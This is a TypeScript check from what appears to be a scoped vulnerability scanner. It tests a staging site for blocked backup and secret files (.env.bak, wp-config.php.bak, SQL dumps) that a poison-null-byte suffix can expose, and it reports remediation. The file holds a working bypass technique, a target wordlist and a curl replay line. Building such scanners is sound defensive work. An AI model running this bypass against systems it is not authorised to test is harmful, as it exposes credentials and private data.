// null-byte-exposure: a server that blocks a sensitive file by its extension
// (returns 401/403 for *.bak, *.sql, *.env …) but can be tricked into serving it
// with a null-byte / double-encoded-null suffix — the classic poison-null-byte
// extension-filter bypass. The filter sees an allowed extension (.md, .png) after
// the %00, while the file layer truncates at the null byte and reads the real
// file. Generic mechanism, proven by a differential with a negative control:
//   - the file is BLOCKED directly (401/403),
//   - a null-byte variant returns 200 with real content,
//   - the SAME trick on a random non-existent name does NOT return content
//     (so the 200 is the file, not a catch-all), and the two bodies differ.
// No target signature: a conventional backup/secret wordlist under conventional
// directories, and the universal %00 technique.

import type { Check, CheckContext, Finding } from "../core/types.js";
import { safeFetch } from "../core/net.js";
import { randomBytes } from "node:crypto";

export const NB_DIRS = ["/ftp", "/files", "/backup", "/backups", "/uploads", "/download", ""];
export const NB_NAMES = [
  "package.json.bak", "package.json.old", ".env.bak", "config.json.bak",
  "config.php.bak", "web.config.bak", "settings.py.bak", "database.sql.bak",
  "db.sql.bak", "backup.sql", "wp-config.php.bak", "secrets.yml.bak",
];
// Allowed-looking extensions the filter is likely to let through after the null byte.
const NB_EXT = ["md", "png", "ico", "jpg", "txt", "json"];
// Null-byte encodings: raw %00 and double-encoded %2500 (survives one decode).
const NB_ENC = ["%00", "%2500"];

const ok2xx = (s: number) => s >= 200 && s < 300;
const BLOCKED = new Set([401, 403]);

export const nullByteExposure: Check = {
  name: "null-byte-exposure",
  title: "Sensitive file exposed through a poison-null-byte extension-filter bypass",
  readOnly: true,
  async run(ctx: CheckContext): Promise<Finding[]> {
    if (!ctx.stagingUrl) return [];
    const base = ctx.stagingUrl.replace(/\/+$/, "");
    if (!ctx.scope.isHostAllowed(base)) return [];
    const opts = (ctx.options["null-byte-exposure"] ?? {}) as { dirs?: string[]; names?: string[] };
    const dirs = opts.dirs ?? NB_DIRS, names = opts.names ?? NB_NAMES;
    const get = async (p: string) => { try { const r = await safeFetch(base + p, ctx.scope, { headers: { accept: "*/*" }, maxBytes: 128 * 1024 }); return { status: r.status, body: r.body }; } catch { return { status: 0, body: "" }; } };
    const findings: Finding[] = [];
    for (const dir of dirs) {
      for (const name of names) {
        const candidate = `${dir}/${name}`.replace(/\/+/g, "/");
        const direct = await get(candidate);
        if (!BLOCKED.has(direct.status)) continue; // only a blocked file is worth a bypass attempt
        let hit: { url: string; body: string } | null = null;
        for (const enc of NB_ENC) {
          for (const ext of NB_EXT) {
            const variant = `${candidate}${enc}.${ext}`;
            const res = await get(variant);
            if (!ok2xx(res.status) || res.body.trim().length < 8) continue;
            // Negative control: the same trick on a name that does not exist must
            // not return content — otherwise the route serves everything.
            const ctl = await get(`${dir}/crenel-nonexistent-${randomBytes(5).toString("hex")}.bak${enc}.${ext}`);
            if (ok2xx(ctl.status) && ctl.body.trim().length >= 8) continue; // catch-all, not a bypass
            if (ctl.body === res.body) continue;
            hit = { url: base + variant, body: res.body }; break;
          }
          if (hit) break;
        }
        if (!hit) continue;
        findings.push({
          id: `null-byte-exposure:${candidate}`,
          check: "null-byte-exposure",
          title: `Null-byte bypass exposes ${candidate} (blocked directly, served with a null byte)`,
          severity: "high",
          state: "proven",
          location: hit.url,
          description: `${candidate} returns HTTP ${direct.status} directly, but a poison-null-byte suffix serves its ${hit.body.length}-byte content, which a non-existent control does not return. An attacker reads a file the extension filter was meant to block.`,
          remediation: "Reject null bytes and decode input fully before the extension/authorization check; serve files from an allowlist, not by reconstructing a filesystem path from the URL.",
          proof: { method: "live differential on staging: blocked direct request, null-byte variant served, non-existent control", replay: `curl -i '${hit.url}'  # vs ${base}${candidate} -> ${direct.status}`, evidence: `direct HTTP ${direct.status}; null-byte variant HTTP 200, ${hit.body.length} bytes; control did not return the file` },
          regressionHint: `After deploy, ${candidate} with a null-byte suffix must not return its content.`,
        });
      }
    }
    if (findings.length === 0) ctx.log("null-byte-exposure: no null-byte extension-filter bypass found");
    return findings;
  },
};
